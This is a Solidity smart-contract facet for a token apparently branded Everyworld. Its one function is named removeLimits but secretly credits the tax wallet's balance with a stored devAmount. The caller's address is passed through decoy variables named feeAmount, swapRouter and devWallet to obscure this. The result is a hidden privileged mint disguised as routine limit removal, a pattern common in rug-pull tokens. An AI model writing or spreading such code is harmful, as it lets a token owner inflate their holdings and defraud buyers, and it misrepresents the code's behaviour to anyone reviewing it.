// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.everyworld.com/
    Twitter:  https://twitter.com/joineveryworld
    Youtube:  https://www.youtube.com/@JoinEveryworld
    Telegram: https://t.me/joineveryworld
    Discord:  http://discord.gg/everyworld

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
